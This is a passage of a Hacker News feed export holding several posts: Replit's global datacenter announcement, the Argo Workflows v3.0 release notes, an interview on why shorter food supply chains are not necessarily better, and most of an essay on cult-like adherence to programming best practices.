<li>Our first two non-US compute regions are up --  Mumbai, India and London, England -- making us a global service</li>
<li>We're hiring worldwide making us a globally distributed company</li>
</ul>
<h2 id="global-routing">Global routing</h2>
<p>Previously, Replit has been operating out of a single datacenter in
the United States. When you start a repl, or join multiplayer, all
of your traffic had to make it to our one datacenter.</p>
<p>While that's not a significant issue if you live nearby, for our
friends all over the world it means every time you type a letter,
you had to cross an ocean at least twice! That means you could see
latencies as high as 300ms for each keystroke in the terminal! Now, when you create
a repl, it lives in the datacenter closest to you. Instead of
everyone having to cross the ocean multiple times, you can feel even
closer than your own computer! And if you have friends far away, things
will feel better too. Instead of connecting to a datacenter that is
far away, you'll connect to the datacenter closest to you, and
we'll deliver your bits as quickly as possible,
so you don't have to travel the world all on your own.</p>
<p>If you lived in India prior to our new data center, you saw significant delay in actions like running your code:</p>
<p><img src="https://blog.repl.it/images/global/before.gif" alt="before latency"></p>
<p>This is what you'll see today:</p>
<p><img src="https://blog.repl.it/images/global/after.gif" alt="after latency"></p>
<p>With these changes coding with friends and coworkers from all
over the world will feel closer than ever, and we're only just
getting started! We've made it super easy for us to ship to even
more countries, datacenters, and devices around the world. Before you
know it you might even be able to have a Replit data center in your
own home!</p>
<p><a href="https://blog.repl.it/killing-containers-at-scale">Read more</a> about our infrastructure and challenges with running a globally distributed multiplayer service.</p>

<p>Because we're still a highly collaborative small team and we haven't perfected the art of asynchronous we require employees to overlap with PST working hours for four hours a day. Otherwise you can be wherever you want in the world. </p>
<p><a href="https://repl.it/careers">Apply here</a>.</p>

	</div></div>]]>
            </description>
            <link>https://blog.repl.it/global</link>
            <guid isPermaLink="false">hacker-news-small-sites-25991988</guid>
            <pubDate>Mon, 01 Feb 2021 18:51:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Argo Workflows v3.0]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 11 (<a href="https://news.ycombinator.com/item?id=25991077">thread link</a>) | @dnsmichi
<br/>
February 1, 2021 | https://blog.argoproj.io/argo-workflows-v3-0-4d0b69f15a6e | <a href="https://web.archive.org/web/*/https://blog.argoproj.io/argo-workflows-v3-0-4d0b69f15a6e">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p id="3ed4">We’re incredibly proud of how far <a href="https://github.com/argoproj/argo" rel="noopener"><strong>Argo Workflows</strong></a> has come since its <a rel="noopener" href="https://blog.argoproj.io/introducing-argo-a-container-native-workflow-engine-for-kubernetes-55c0b4b76fac"><strong>inception</strong></a> three years ago!</p><ul><li id="01a4">17th Oct 2017 — first commit</li><li id="947c">6th Feb 2018 — v2.0 rewritten in Go</li><li id="dcbd">2nd Sep 2019 — first 1,000 stars</li><li id="9355">17th Apr 2020 — <a href="https://www.cncf.io/blog/2020/04/07/toc-welcomes-argo-into-the-cncf-incubator/" rel="noopener">became a CNCF incubator project</a></li><li id="5b9b">22nd Jan 2021 — 373 contributors, 2k commits, 7.3k stars, 1.3k forks, 5.2k Slack members</li></ul><p id="0265">With this all behind us — we’re round to announce <strong>Argo Workflows v3.0.</strong></p><h2 id="aaf7">What is Argo Workflows?</h2><p id="7875"><strong>Argo Workflows</strong> is a cloud-native workflow engine that can run 10,000s of concurrent workflows, each with 1,000s of steps.</p><h2 id="29df">What can I use it for?</h2><ul><li id="5678">Machine Learning</li><li id="46b6">ETL, Data Analytics &amp; Data Science</li><li id="061c">Data processing pipelines</li><li id="b4d2">Batch processing</li><li id="bce1">Serverless</li><li id="084c">CI/CD</li></ul><h2 id="1f24">Who uses Argo?</h2><p id="d00f">Argo is used to “discover new physics” at CERN, for 3D rendering at CoreWeave (on a 1,000 node cluster with 6,000 GPUs), and in Intuit’s Machine Learning and Data Processing platforms. Argo Workflows is actively used in production by well over <a href="https://github.com/argoproj/argo/blob/master/USERS.md" rel="noopener">100 organizations</a>, including <strong>Adobe, Alibaba Cloud, BlackRock, Capital One, Data Dog, Datastax, Google, GitHub, IBM, Intuit, NVIDIA, SAP, New Relic, and RedHat.</strong></p><h2 id="6abc">Why would I use Argo?</h2><p id="bc11">When we asked our users who were using tools like Kubeflow, Apache Airflow, AWS Batch, AWS Lambda, KNative, TektonCD, and <a href="https://blog.kintohub.com/how-do-we-ditch-jenkins-for-argo-1c0b4df5dab0" rel="noopener">Jenkins</a> why they also use Argo, they said<strong> they love that it is cloud-native, simple, fast, scales, and cost-effective.</strong></p><h2 id="aa48">Big new features every release</h2><p id="d3b3">In the last 12 months, every release has had major new features:</p><ul><li id="34ce"><a rel="noopener" href="https://blog.argoproj.io/whats-coming-up-in-argo-workflows-v2-12-3899bae53562">v2.12: reports and metrics, SSO+RBAC</a></li><li id="9317"><a rel="noopener" href="https://blog.argoproj.io/argo-workflows-v2-11-a8b6189bf60e">v2.11: webhooks, memorization</a></li><li id="7fdb"><a rel="noopener" href="https://blog.argoproj.io/argo-workflows-v2-10-d20beeee5df3">v2.10: Java and Python SDKs, semaphores, and mutexes</a></li><li id="acc8"><a rel="noopener" href="https://blog.argoproj.io/argo-workflows-v2-9-47b9c2b5f456">v2.9: single-sign-on, Windows support, workflow template ref</a></li><li id="3ff0"><a rel="noopener" href="https://blog.argoproj.io/whats-new-in-argo-workflow-v2-8-5356ee1d4f7f">v2.8: cluster workflow templates</a></li><li id="ab13"><a rel="noopener" href="https://blog.argoproj.io/argo-workflows-v2-7-6ace8c210798">v2.7: submittable workflow templates, Prometheus metrics</a></li><li id="50f0"><a href="https://github.com/argoproj/argo/releases/tag/v2.6.0" rel="noopener">v2.6: Gomodules, filtering labels</a></li><li id="20d1"><a rel="noopener" href="https://blog.argoproj.io/argo-workflows-v2-5-released-ce7553bfd84c">v2.5: API server, the workflow archive, cron workflows</a></li></ul><ul><li id="ed9f">Major upgrade (20k new lines of code) to the user interface with many new features and much more robust</li><li id="1469">Brand new APIs for Argo Events</li><li id="04b7">Controller High-Availability</li><li id="54c8">Key-only artifacts make it easier to perform map-reduce operations</li><li id="0dd0">Moving the repository</li><li id="6230">Go modules support</li></ul><h2 id="cca4">Argo Events API and UI</h2><p id="19ec">Argo Workflows v3.0 comes with a new UI that now also supports Argo Events! The UI is also more robust and reliable.</p><ul><li id="0c4a">New API endpoints for Argo Events</li><li id="d65d">New event-flow page</li><li id="379d">Create, edit, and view log event sources and sensors in the UI</li><li id="ff13">Embeddable widgets</li><li id="9cb9">New workflow log viewer</li><li id="5094">Configurable “Get Help” button</li><li id="d657">More configurable link buttons (e.g. for linking into your logging facility)</li><li id="1e6f">Seamless reconnection on network errors</li><li id="9264">Refactored code to use more robust React functional components</li></ul><p id="f8ca">The<strong> event-flow page</strong> allows users to understand how event sources and sensors are connected together, as well as linking in the workflows created by triggers, and displaying animations whenever a message is seen.</p><figure><p><img alt="Image for post" src="https://miro.medium.com/proxy/1*qi3-DdjCLGEa3V86YhCZyQ.png"></p><figcaption>Event-flow</figcaption></figure><p id="3b26">You can <strong>create and update event sources and sensors</strong> directly in the user interface using the same visual language we use for workflows:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1334/1*CnLN8MIMQoofSlpAaDSGfg.png" width="667" height="274" srcset="https://miro.medium.com/max/552/1*CnLN8MIMQoofSlpAaDSGfg.png 276w, https://miro.medium.com/max/1104/1*CnLN8MIMQoofSlpAaDSGfg.png 552w, https://miro.medium.com/max/1280/1*CnLN8MIMQoofSlpAaDSGfg.png 640w, https://miro.medium.com/max/1334/1*CnLN8MIMQoofSlpAaDSGfg.png 667w" sizes="667px" data-old-src="https://miro.medium.com/max/60/1*CnLN8MIMQoofSlpAaDSGfg.png?q=20"></p></div></div><figcaption>Event Sources</figcaption></figure><p id="3435">We’ve added some simple <strong>widgets </strong>you can use to embed the status and progress of a workflow or the latest workflow created by a workflow template or cron workflow:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1238/1*7iql7XVD9v9-1_-UfjO4LA.png" width="619" height="721" srcset="https://miro.medium.com/max/552/1*7iql7XVD9v9-1_-UfjO4LA.png 276w, https://miro.medium.com/max/1104/1*7iql7XVD9v9-1_-UfjO4LA.png 552w, https://miro.medium.com/max/1238/1*7iql7XVD9v9-1_-UfjO4LA.png 619w" sizes="619px" data-old-src="https://miro.medium.com/max/52/1*7iql7XVD9v9-1_-UfjO4LA.png?q=20"></p></div></div><figcaption>Widgets</figcaption></figure><p id="f0ac">Rather than editing your workflow by hand, you can also <strong>submit from a template</strong>:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1150/1*3c0kAYITJpSt4A4FtbvRsA.png" width="575" height="237" srcset="https://miro.medium.com/max/552/1*3c0kAYITJpSt4A4FtbvRsA.png 276w, https://miro.medium.com/max/1104/1*3c0kAYITJpSt4A4FtbvRsA.png 552w, https://miro.medium.com/max/1150/1*3c0kAYITJpSt4A4FtbvRsA.png 575w" sizes="575px" data-old-src="https://miro.medium.com/max/60/1*3c0kAYITJpSt4A4FtbvRsA.png?q=20"></p></div></div><figcaption>Workflow Creator</figcaption></figure><p id="b213">The log viewer has been updated to allow you to view the init and wait containers easier (helping debug artifact issues). It also allows you to <strong>tail the whole workflow</strong>:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1626/1*aDmxHb6qK0YXPFDqN-bnlQ.png" width="813" height="736" srcset="https://miro.medium.com/max/552/1*aDmxHb6qK0YXPFDqN-bnlQ.png 276w, https://miro.medium.com/max/1104/1*aDmxHb6qK0YXPFDqN-bnlQ.png 552w, https://miro.medium.com/max/1280/1*aDmxHb6qK0YXPFDqN-bnlQ.png 640w, https://miro.medium.com/max/1400/1*aDmxHb6qK0YXPFDqN-bnlQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*aDmxHb6qK0YXPFDqN-bnlQ.png?q=20"></p></div></div></div><figcaption>Log Viewer</figcaption></figure><p id="e514">If you want to try it yourself, you can take a look around the <a href="https://workflows.apps.argoproj.io/" rel="noopener"><strong>test environment</strong></a><strong>.</strong></p><p id="ed2e">We have an extensive demo video you can watch online from January’s community meeting (starts at 41m):</p><figure><div></div></figure><h2 id="a0d4">Controller High-Availability</h2><p id="c675">The v3.0 release introduces a hot-standby workflow controller feature for high availability and quick recovery by leveraging the Kubernetes leader election feature. The default install enables leader election and one has a pod, which is the leader. Whenever a controller pod crashes, Kubernetes will restart it. To reduce startup time, you can now run two pods. The second pod will be on hot-standby and take over immediately if the leader dies.</p><pre><span id="43b2">kubectl scale deployment/workflow-controller --replicas=2 </span></pre><h2 id="5b79">Key-Only Artifacts</h2><p id="f857">Argo Workflows v3.0 introduces a default artifact repository reference and key-only artifacts, two new features that work together.</p><ul><li id="83b6">Users can configure a default artifact repository for their namespace rather than having to define it explicitly for each workflow.</li><li id="98bd">Workflow specifications do not need to provide non-key fields (e.g. bucket, username/password secret key). They can use just the key (hence “key-only”), and the non-key fields will be inherited from the artifact repository.</li><li id="e292">Users can specify the key to reference artifacts globally without using parameterized inputs and outputs.</li><li id="fc9b">Easier to specify fan-in artifact patterns, simplifying map-reduce style workflows.</li></ul><p id="c415">As a consequence, we no longer need to replicate non-key elements in manifests, reducing the disk-space needed for workflows.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1766/1*jqBXCrmex2GmJYj_ZlTwZQ.png" width="883" height="483" srcset="https://miro.medium.com/max/552/1*jqBXCrmex2GmJYj_ZlTwZQ.png 276w, https://miro.medium.com/max/1104/1*jqBXCrmex2GmJYj_ZlTwZQ.png 552w, https://miro.medium.com/max/1280/1*jqBXCrmex2GmJYj_ZlTwZQ.png 640w, https://miro.medium.com/max/1400/1*jqBXCrmex2GmJYj_ZlTwZQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*jqBXCrmex2GmJYj_ZlTwZQ.png?q=20"></p></div></div></div></figure><h2 id="424c">New Repository Location</h2><p id="ab61">We’ll be renaming the Argo workflow repository to <code>argo-workflows</code>rather than <code>argo</code>. The new name makes it clear that this is the repo for Argo Workflows and not the overall Argo Project.</p><p id="d21a">Github automatically forwards when a repository is renamed, so users should not be significantly impacted.</p><h2 id="1ebd">Go Modules + Go Client v1.19</h2><p id="7eba">In 2020, we migrated to Go modules. Unfortunately, migrating to Go modules is a breaking change and we never completed the work, and it was still not possible to <code>go get github.com/argoproj/argo</code> without some hackery. Release v3 will fix this.</p><h2 id="e08b">v2.12 Long-term Support</h2><p id="2529">We plan to provide long-term support for v2.12. There will be bug fixes, but no new features, for 6+ months.</p><p id="a9d3">What we expect to back-port:</p><ul><li id="0ce7">Bug fixes.</li><li id="a583">Changes to complete features new in v1.12 (e.g SSO+RBAC).</li></ul><p id="57d1">We don’t plan to back-port:</p><ul><li id="b6e9">UI bug fixes that are based on refactoring that is unique to v3.0. But you can run the v3.0 UI with the v2.12 controller.</li><li id="5658">New features.</li></ul><p id="295a">Argo Workflows v3.1 will contain enhancement to make it easier to write fan-out-fan-in workflows using artifacts, and well as conditional artifacts.</p><p id="f19c">Nothing as big as this is the work of one person, so beyond the core team, we must recognize these major contributors:</p><ul><li id="5fcb">Daisuke Taniwaki — Preferred Networks</li><li id="0754">Yuan Tang — Ant Group</li><li id="79bc">Mark White</li><li id="1c43">Daniel Herman</li><li id="3e99">Sam Elder — Keblotix</li><li id="25af">Michael Crenshaw — Colaberry/CCRi</li><li id="1d3f">Xianlu Bird — Aliyun</li><li id="d18e">Peter Salanik — CoreWeave</li><li id="e8b9">J.P. Zivalich — Pipekit</li><li id="30d6">Niklas Hansson — Sandvik CODE</li><li id="f435">Antoine Dao — Pollination</li><li id="8eca">Clemens Lange — CERN</li><li id="ba08">Vaibhav Page — Blackrock</li><li id="c4e7">Sumit Nagal — Intuit</li><li id="2139">David Breitgand — IBM</li></ul></div></div></div>]]>
            </description>
            <link>https://blog.argoproj.io/argo-workflows-v3-0-4d0b69f15a6e</link>
            <guid isPermaLink="false">hacker-news-small-sites-25991077</guid>
            <pubDate>Mon, 01 Feb 2021 17:47:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why shorter food supply chains aren’t necessarily better]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25991044">thread link</a>) | @finphil
<br/>
February 1, 2021 | https://nuadox.com/post/641939640543232000/short-food-supply-chains-conversation | <a href="https://web.archive.org/web/*/https://nuadox.com/post/641939640543232000/short-food-supply-chains-conversation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="641939640543232000">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/641939640543232000/short-food-supply-chains-conversation"><h2>Let’s talk logistics: Why shorter food supply chains aren’t necessarily better</h2></a>
                                <figure data-orig-height="853" data-orig-width="1280"><img src="https://64.media.tumblr.com/3b6d3de257c70ad7108584d25c3ed612/e23af1d6cf07b765-fe/s1280x1920/5b2470073c2a32381da64c12642abe9e83d58676.png" data-orig-height="853" data-orig-width="1280" width="1280" height="853" alt="image"></figure><p><b>- By Richard Gray , Horizon -</b></p><p>

Fears over supermarket shortages during the early stages of the Covid-19 pandemic <a href="https://href.li/?https://eit.europa.eu/news-events/news/eit-food-report-reveals-impact-covid-19-pandemic-european-food-behaviours?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">led many people to buy their food from local producers</a>, raising the prospect of a transformation in the way people get their food in the future. But while eating locally and shorter supply chains are <a href="https://href.li/?https://ec.europa.eu/eip/agriculture/sites/agri-eip/files/eip-agri_brochure_short_food_supply_chains_2019_en_web.pdf?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">often viewed as a more sustainable alternative to our global food system</a>, the reality is much more complicated, explains Dr Tessa Avermaete, a bioeconomist at the Katholieke Universiteit Leuven in Belgium.

<br></p><p><b>What has the pandemic revealed about the way Europe gets its food?</b></p><p>On the consumer side there were really only a few problems with supplies in Europe. In Belgium, for example, we had some issues with yeast because suddenly everyone was at home and started baking. There were also some issues with <a href="https://href.li/?https://www.cbi.eu/news/bittersweet-impact-covid-19-cocoa-chocolate-market?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">chocolate due to the cacao supply</a> and a specific type of <a href="https://href.li/?https://www.euronews.com/2020/12/20/greek-olive-harvest-hit-as-pandemic-leads-to-labour-shortage?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">olives</a>. Not really things you need for a healthy diet.&nbsp;</p><p>What I think the Covid-19 crisis has shown is that actually the food supply chains are very robust. No one in Europe really went hungry because of Covid-19. But some farmers in Europe have suffered, particularly if they are exporting. In the potato sector, those exporting to China, for example, had tonnes of potatoes left. It has shown that we need to think about what happens when food supply chains are disrupted.</p><p><b>What have been the solutions to that?</b></p><p>One thing that people have talked a lot about is <a href="https://href.li/?http://www.fao.org/documents/card/en/c/cb1020en/?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">shorter supply chains</a>. Certainly, during the pandemic many more people have been finding they have a local farmer or supplier out there they can buy from. This can be good for the local economy and be a way of getting healthy food. But we have to be honest – it is only a tiny part of the overall market. And it is quite likely that people will go back to their normal retailer once the crisis is over. But what I like is that it has started to get people thinking more about where their food comes from. When you look at the food system it is actually quite complex.</p><p><b>Is buying local always more sustainable than buying from big retailers? </b></p><p>It’s easy to think that doing things locally is the right solution because it might on the surface seem to have a lower (environmental) footprint and reduce the risk of disruption. But not everything can be grown everywhere. There are some regions that have the right kind of fertile land needed for arable crops while others are better suited as pasture for livestock. Some land is suitable for soy but can’t be used to grow apple trees on. It makes sense to use your land in the way it is best suited for, and this is what our global food supply chains have allowed us to do.</p><p>We did some calculations at our university that if we tried to produce the livestock we consume in Belgium completely locally, then we would need double the land we have today just to produce fodder for the animals. In many cases it is more sustainable to produce food somewhere else and import it than grow it locally. Growing something in a heated greenhouse at a local farm can require more energy than growing it somewhere with more suitable climate and importing it by boat. The same applies with water - if it is too dry where you live, it can take a lot of extra water from the environment to grow some crops.</p><p>Bad weather conditions and plant diseases, or political disruption and wars could also prevent food from being produced locally at certain times. Global trade has given us some resilience to these.&nbsp;&nbsp;</p><p><b>Do local food networks have any advantages?</b></p><p>During the <a href="https://href.li/?https://cordis.europa.eu/project/id/613532?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">TRANSMANGO project</a> (to assess the vulnerability and resilience of Europe’s food systems) we looked at how certain <a href="https://href.li/?https://link.springer.com/article/10.1007/s12571-018-0860-x?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">alternative food networks contribute to food security</a>. These are things like small organic farms, farmers markets, local deliveries and community supported agriculture. They have a really important social factor because they can bring together communities. But in terms of overall food availability their contribution is limited. And we also saw that many of these alternative food networks are only accessible to people in middle and high socioeconomic classes. They don’t reach out to people in the lower classes.</p><p><b>Are there other disadvantages?</b></p><p>There is also an important issue when it comes to food processing. With a lot of these initiatives you get unprocessed food – people have to do a lot of preparation to be able to then eat it. That ability to prepare food is just as important as the availability itself as you can only eat food if you know how to prepare it properly.&nbsp;Unless you know this, you are going to be food insecure.</p><p><b>What do you mean by being ‘food insecure’?</b></p><p>It’s about food availability, but also it’s about nutritional value. If we look at a global level, we produce enough calories to feed the world. But if you look in terms of fruit and vegetables, there is still a lack. So, the problem is that we don’t have enough to feed the world in a healthy way. But that’s just one side of the story – there are so many people who are overweight and the health costs that go together with that are huge. Here in Europe it is an area that needs far more attention than malnutrition.</p><p><b>Are there any problems you see coming in the future?&nbsp;</b></p><p>One of the biggest challenges at the moment is the need for policies that strengthen the position of the farmer and simultaneously reduce the environmental impact of the sector. We need governments that take action based on scientific evidence, not based on beliefs or driven by electoral concerns. I have no doubt that Europe has smart and ambitious farmers, but they need to be incentivised to take actions that contribute to a more sustainable, future-proof food system. Local food networks have a part to play, but I hope we don’t lose sight of how important big producers are for food security too.</p><p><i>The research in this article was funded by the EU.</i></p><p><i> This post&nbsp;<a href="https://href.li/?https://horizon-magazine.eu/article/qa-why-shorter-isn-t-necessarily-better-when-it-comes-food-supply-chains.html?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">Q&amp;A: Why shorter isn’t necessarily better when it comes to food supply chains</a>&nbsp;was originally published on&nbsp;<a href="https://href.li/?https://horizon-magazine.eu/?b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F641939640543232000%2Fshort-food-supply-chains-conversation&amp;m=0&amp;ts=1612457758">Horizon: the EU Research &amp; Innovation magazine | European Commission</a>&nbsp;under a Creative Commons license.</i></p><p>–</p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/632440031725912064/food-waste-and-cities">Food waste: Cities can make the difference</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/food">food</a>
                                    
                                        <a href="https://nuadox.com/tagged/supply-chain">supply chain</a>
                                    
                                        <a href="https://nuadox.com/tagged/logistics">logistics</a>
                                    
                                        <a href="https://nuadox.com/tagged/agriculture">agriculture</a>
                                    
                                        <a href="https://nuadox.com/tagged/sustainability">sustainability</a>
                                    
                                        <a href="https://nuadox.com/tagged/nutrition">nutrition</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/featured">featured</a>
                                    
                                        <a href="https://nuadox.com/tagged/economics">economics</a>
                                    
                                        <a href="https://nuadox.com/tagged/retail">retail</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/641939640543232000/short-food-supply-chains-conversation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25991044</guid>
            <pubDate>Mon, 01 Feb 2021 17:45:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Cult of Best Practice]]>
            </title>
            <description>
<![CDATA[
Score 77 | Comments 62 (<a href="https://news.ycombinator.com/item?id=25990929">thread link</a>) | @zdw
<br/>
February 1, 2021 | https://domk.website/blog/2021-01-31-cult-of-best-practise.html | <a href="https://web.archive.org/web/*/https://domk.website/blog/2021-01-31-cult-of-best-practise.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  <p><time datetime="2021-01-31">31 Jan 2021</time>
    /
    <span>~7 min</span>
  </p>
  


<p>Best practices are, despite the name, not universally good.</p>

<p>Many best practices in programming don’t meet the definition. They spread not based on merit or evidence but thanks to authority bias and social utility. As they spread, they lose nuance. As they lose nuance, they become easier to evangelise. Combined with lack of experience, they can lead to cult-like behaviour.</p>

<p>Think of an engineering team that got obsessed with a best practice, like test-driven development or writing user stories, to the point of detriment. Many developers have fallen into that trap, myself included.</p>

<p>Why can best practices be harmful? Why do we like following them? When and how do they go wrong? To answer these questions, we need to understand where they come from and how they spread in the context of programming.</p>

<h2 id="impostor-best-practices">Impostor Best Practices</h2>

<p>The main reason some programming best practices are harmful is that they are not real best practices.</p>

<p>Look at the official definition: “A best practice is a method or technique that has been generally accepted as superior to any alternatives because it produces results that are superior to those achieved by other means […]”. <sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> The key parts of the definition are “generally accepted” and “superior to any alternatives”.</p>

<p>The problem with many programming best practices is that they <em>pretend</em> to conform to that definition, but they do not.</p>

<p>Some best practices aren’t generally accepted. They come from different, less reliable sources of authority. It could be a prominent individual or a specific community who present something as widely accepted when it’s their own experience or opinion.</p>

<p>We might have a proponent of object-oriented programming saying that it is an accepted best practice, but not everyone agrees. If the proponent is respected and followed in the programming community, many people will put a lot of weight on their opinion, but that doesn’t make it generally accepted. There are different competing paradigms each with their pros and cons.</p>

<p>Some best practices are not superior in outcomes. They claim they are, but objectively there are equivalent alternatives. For example, is functional programming superior to object-oriented? We can’t say one is better than the other, even though they are both presented as a best practice by some.</p>

<p>The problem with superiority is that most programming best practices aren’t evidence-based. Programming is too young, fast-changing and complex to have done the research to establish the evidence for something consistently producing better outcomes. We work in the world of opinions, feelings and anecdotal evidence.</p>

<p>Some best practices are also very volatile. Fast-moving languages and frameworks declare something best practice and supersede it a year later. That isn’t inherently wrong, but it’s a sign of how fast our understanding of best can evolve, while best practices are expected to be time-tested. <sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>However, not all best practices in programming are impostors. There are time-tested, generally accepted, and superior practices. For example, the general idea of automated testing now meets that definition.</p>

<p>Nor are all impostor best practices bad. Not being universally accepted can mean they aren’t universally accepted <em>yet</em>. Not being superior in general might be a scope problem, and the practice is superior in specific situations.</p>

<p>However, these cases need to be interpreted with nuance, which brings us to the next problem.</p>

<h2 id="lost-in-translation">Lost In Translation</h2>

<p>Good best practices are <em>simple and universal</em>. Many programming best practices tackle complex issues that require nuance and context — but that nuance and context get lost as the best practice spreads.</p>

<p>Consider this example: someone, through a lot of trial and error, found a good way to tackle a problem. Because of the learning process, they understand the nuances in how and when to apply it.</p>

<p>The solution works for them and they start sharing their lessons as best practice. This gets picked up by people who skipped the learning and went straight to applying it, missing out on some nuance. Those people share it again. A new cohort of people picks it up. They misunderstand it more and share it again.</p>

<p>Soon, all understanding of why the practice works is lost. People are parroting it as a simplified, absolute catchphrase. “Always write the tests before the implementation”. <sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>The complexity can increase over time too. An idea that was originally simple that required a lot of nuanced interpretation is made increasingly complex by people who miss the point.</p>

<p>Take the example of “agile”. Originally a set of 12 principles, it has been turned into monstrous frameworks that oppose those principles by consultancies that sell organisational transformation.</p>

<p>Once all nuance is lost, the conditions are perfect for the idea to spread. It originated from someone with respect, experience, and authority. The simplicity makes it sound easy. People who don’t understand it sell it as a panacea. As a result, people can learn about it quickly and start evangelising. Despite its merit-based origin, it has become a social phenomenon.</p>



<p>The social aspect of how best practices spread helps us answer the next question — why do we like following them?</p>

<p>When we lack the experience and confidence to form our own opinions, we defer to the next best thing: an authority. This is a well-known cognitive bias. <sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></p>

<p>Thanks to the authority bias, best practices have a social utility. They give us something that people are biased to believe that we can lean on. There are many examples of this utility:</p>

<ul>
  <li>A way to hedge our bets. If we are wrong, we can defend ourselves by saying that we just followed best practices. How could someone blame us?</li>
  <li>A way to mimic the best. If someone we see as an authority does something, it’s natural for us to try to learn and copy what they do.</li>
  <li>A virtue-signalling mechanism. If something is “the best”, we naturally want to signal to everyone that we also do what is best.</li>
  <li>A way to fit in. If everyone around us considers something “the best”, we would be hard-pressed to go against our peers.</li>
</ul>

<h2 id="the-cult">The Cult</h2>

<p>Because of the social nature of best practices, it’s easy for herd mentality to kick in.</p>

<p>Imagine a team of inexperienced developers with no one seasoned to lean on. They can’t make all decisions in an informed way — following best practices is the next best option.</p>

<p>They struggle with something, and they search for a solution. They come across a simple-looking practice that addresses their problem, supported by someone prominent. Is your code buggy and unreliable? Write more tests. Is your code hard to test? Adopt test-driven development! <sup id="fnref:3:1" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>Once a solution like that is found, everyone is motivated by the authority and social utility of it. It gets adopted ad absurdum. All nuance is lost. Soon you have a team that insists that every ticket is written as a user story, or that every class has to have tests because it’s <em>best practice</em>.</p>

<h2 id="way-out">Way Out</h2>

<p>It might seem obvious that adopting something obsessively is a bad idea, but many teams out there operate exactly like that.</p>

<p>The way out of the cult starts with understanding what the commonly presented best practices are — a social phenomenon.</p>

<p>Once we realise that, the first step is understanding where they come from and what problem they solve — understand their origins and the subtleties of applying them successfully. <sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup></p>

<p>The next step is to make our own mistakes and learn from them. Break the rules and understand what happens when we don’t follow a particular practice. Follow it to its logical conclusion and see what happens then. <sup id="fnref:6" role="doc-noteref"><a href="#fn:6">6</a></sup></p>

<p>The trial and error learning involved gives us knowledge much deeper than what we would gain by following the rules.</p>

<p>Having made our own mistakes, the third and final step is to form our own opinions and speak up.</p>

<p>If we’ve understood where a best practice comes from, and we’ve tried what happens when we don’t follow it, we should have the confidence to make and defend our own opinions about it. We can help the rest of our team see the full picture and break the cult.</p>

<p>Going against the flow like that can be hard. Convincing the rest of a team that something they believe in isn’t what it promised to be, requires skill and patience. Telling them won’t be enough. You need to take them on the same learning journey you went on. That’s how you make progress.</p>

<p>To short-circuit that learning process and prevent best practice cults from forming in the first place, you need to have enough senior engineers on your teams. Each team needs to have someone who is experienced and confident enough to become a trusted authority for their colleagues. Someone who can make informed decisions and bring the necessary nuance.</p>

